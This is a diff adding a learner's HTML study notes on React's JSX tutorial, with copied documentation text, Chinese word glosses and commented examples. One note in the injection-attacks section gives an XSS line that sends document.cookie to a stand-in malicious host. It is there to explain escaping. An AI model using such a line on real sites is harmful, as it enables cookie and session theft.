@@ -1,0 +1,248 @@
+<section>
+    <h1>Introducing JSX</h1>
+    <script type="text/babel">
+        // const element = <h1>hello world!</h1>
+        // // Uncaught SyntaxError: expected expression, got '<'
+        // console.log("element", element)
+        // // react element, Inline Babel script:4:16
+    </script>
+    <p>This funny tag syntax is neither a string nor HTML.</p>
+    <p>It is called JSX, and it is a syntax extension to JavaScript. We recommend using it with React to describe what
+        the UI should look like. JSX may remind you of a template language, but it comes with the full power of
+        JavaScript.</p>
+    <p>JSX produces React “elements”. We will explore rendering them to the DOM in the next section. </p>
+</section>
+<section>
+    <h2>Why JSX?</h2>
+    <p>React embraces the fact that rendering logic is inherently coupled with other UI logic: how events are handled,
+        how the state changes over time, and how the data is prepared for display.</p>
+    <p>Instead of artificially adv. 人工地；人为地；不自然地 separating technologies by putting markup and logic in separate files,
+        React separates concerns with loosely coupled units called “components” that contain both. We will come back to
+        components in a further section, but if you’re not yet comfortable putting markup in JS, this talk might
+        convince you otherwise.</p>
+    <p>React doesn’t require using JSX, but most people find it helpful as a visual aid when working with UI inside the
+        JavaScript code. It also allows React to show more useful error and warning messages.</p>
+</section>
+<section>
+    <h2>Embedding Expressions in JSX</h2>
+    <p>In the example below, we declare a variable called name and then use it inside JSX by wrapping it in curly
+        braces:</p>
+    <div id="root"></div>
+    <script type="text/babel">
+        // const name = 'Josh Perez';
+        // const element = <code>Hello, {name}</code>;
+
+        // ReactDOM.render(
+        //     element,
+        //     document.getElementById('root')
+        // );
+    </script>
+    <p>You can put any valid JavaScript expression inside the curly braces in JSX. For example, 2 + 2, user.firstName,
+        or formatName(user) are all valid JavaScript expressions.</p>
+    <p>In the example below, we embed the result of calling a JavaScript function, formatName(user), into an h1 element.
+    </p>
+    <script type="text/babel">
+        // function formatName(user) {
+        //     return user.firstName + ' ' + user.lastName;
+        // }
+
+        // const user = {
+        //     firstName: 'Harper',
+        //     lastName: 'Perez'
+        // };
+        // const element = ( <code> Hello, {formatName(user)} </code> )
+        // const element =  <code> Hello, {formatName(user)} </code> 
+        // const element = (
+        //     <code>
+        //         Hello, {formatName(user)}!
+        //     </code>
+        // );
+        // const element =
+        //     <code>
+        //         Hello, {formatName(user)}!
+        //     </code>
+        //     ;
+        // ReactDOM.render(
+        //     element,
+        //     document.getElementById('root')
+        // );
+        // automatic semicolon insertion
+        // i assume
+        // const element =
+        //     <code>;
+        //         Hello, {formatName(user)}!;
+        //     </code>;
+        //     ;
+    </script>
+    <p>We split JSX over multiple lines for readability. While it isn’t required, when doing this, we also recommend
+        wrapping it in parentheses to avoid the pitfalls n. 陷阱，圈套；缺陷；诱惑 of <a
+            href="https://stackoverflow.com/q/2846283">automatic semicolon insertion</a> . </p>
+</section>
+<section>
+    <h2>JSX is an Expression Too</h2>
+    <p>After compilation, JSX expressions become regular JavaScript function calls and evaluate to JavaScript objects.
+    </p>
+    <p>This means that you can use JSX inside of if statements and for loops, assign it to variables, accept it as
+        arguments, and return it from functions:</p>
+    <script type="text/babel">
+        // function getGreeting(user) {
+        //     if (user) {
+        //         return <h1>Hello, {formatName(user)}!</h1>;
+        //     }
+        //     return <h1>Hello, Stranger.</h1>;
+        // }
+    </script>
+    <p class="note">
+        i think what it means: the jsx expression is
+        &lt;h1&gt;Hello, {formatName(user)}!&lt;/h1&gt;
+        <br>
+        why?
+        statement - functions and classes - return: Specifies the value to be returned by a function.
+        while expression: An expression is any valid unit of code that resolves to a value.
+    </p>
+</section>
+<section>
+    <h2>Specifying Attributes with JSX</h2>
+    <p>You may use quotes to specify string literals as attributes:</p>
+    <p>You may also use curly braces to embed a JavaScript expression in an attribute:</p>
+    <script type="text/babel">
+        const user = {
+            avatarUrl: 'url'
+        }
+        const element1 = <div tabIndex="0"></div>;
+        const element2 = <img src={user.avatarUrl}></img>;
+        // bad practice
+        const element3 = <img src="{user.avatarUrl}"></img>;
+        // const element4 = <img src={user.avatarUrl + "123"}></img>;
+        console.log(element3) // {user.avatarUrl}
+        // console.log(element4) // url123
+    </script>
+    <p class="note">
+        string literals: "0"
+        attribute: tabIndex
+    </p>
+    <p>Don’t put quotes around curly braces when embedding a JavaScript expression in an attribute. You should either
+        use quotes (for string values) or curly braces (for expressions), but not both in the same attribute.</p>
+    <p class="warning">
+        Since JSX is closer to JavaScript than to HTML, React DOM uses camelCase property naming convention instead of
+        HTML attribute names.
+        <br>
+        <br>
+        For example, class becomes className in JSX, and tabindex becomes tabIndex.
+    </p>
+    <p class="note">
+        js - variable naming: lowerCamelCasing, UpperCamelCasing(PascalCasing)
+        html - attribute naming: &lt;abc-def&gt; , data-123:""
+        in jsx:
+        <br>
+        <br>
+        so attribute naming convention: table-index -> tableIndex
+    </p>
+</section>
+<section>
+    <h2>Specifying Children with JSX</h2>
+    <p>If a tag is empty, you may close it immediately with />, like XML:</p>
+    <p>JSX tags may contain children:</p>
+    <script type="text/babel">
+        // const element1 = <img src={user.avatarUrl} />;
+
+        // const element2 = (
+        //     <div>
+        //         <h1>Hello!</h1>
+        //         <h2>Good to see you here.</h2>
+        //     </div>
+        // );
+    </script>
+</section>
+<section>
+    <h2>JSX Prevents Injection Attacks</h2>
+    <p>It is safe to embed user input in JSX:</p>
+    <script type="text/babel">
+        // const title = response.potentiallyMaliciousInput;
+        // // This is safe:
+        // const element = <h1>{title}</h1>;
+    </script>
+    <p>By default, React DOM <a
+            href="https://stackoverflow.com/questions/7381974/which-characters-need-to-be-escaped-in-html">escapes</a>
+        vt. 逃避，避开，避免；被忘掉；被忽视 any values embedded in JSX before rendering them. Thus it ensures that you can never inject
+        anything that’s not explicitly written in your application. Everything is converted to a string before being
+        rendered. This helps prevent XSS (cross-site-scripting) attacks. </p>
+    <p class="note">
+        <br>
+        inside of an element
+        <br>
+        & becomes &amp;
+        <br>
+        Inside of attribute values
+        <br>
+        " becomes &quot;
+        <br>
+        ' becomes &#39;
+        <br>
+        etc
+        <br>
+        XSS:
+        image.src = http://some-malicious-site.com/getcookie?cookie=document.cookie
+    </p>
+</section>
+<section>
+    <h2>JSX Represents Objects</h2>
+    <p>Babel compiles JSX down to React.createElement() calls</p>
+    <p>These two examples are identical:</p>
+    <script type="text/babel">
+        // const element1 = (
+        //     <h1 className="greeting">
+        //         Hello, world!
+        //     </h1>
+        // );
+
+        // const element2 = React.createElement(
+        //     'h1',
+        //     { className: 'greeting' },
+        //     'Hello, world!'
+        // );
+
+        // babel: (jsx)element -> (react)element2 -> (react)element object
+    </script>
+    <p>React.createElement() performs a few checks to help you write bug-free code but essentially it creates an object
+        like this:</p>
+    <script type="text/babel">
+        // Note: this structure is simplified
+        const element = {
+            type: 'h1',
+            props: {
+                className: 'greeting',
+                children: 'Hello, world!'
+            }
+        };</script>
+        <p>These objects are called “React elements”. You can think of them as descriptions of what you want to see on the screen. React reads these objects and uses them to construct the DOM and keep it up to date.</p>
+        <p class="tip">We recommend using the “Babel” language definition for your editor of choice so that both ES6 and JSX code is properly highlighted.</p>
+</section>
+<section>
+    <h2></h2>
+</section>
+<section>
+    <h3></h3>
+</section>
+<section>
+    <h4></h4>
+</section>
+<section>
+    <h5></h5>
+</section>
+
+<section>
+    <h1></h1>
+</section>
+<section>
+    <h2></h2>
+</section>
+<section>
+    <h3></h3>
+</section>
+<section>
+    <h4></h4>
+</section>
+<section>
+    <h5></h5>
+</section>
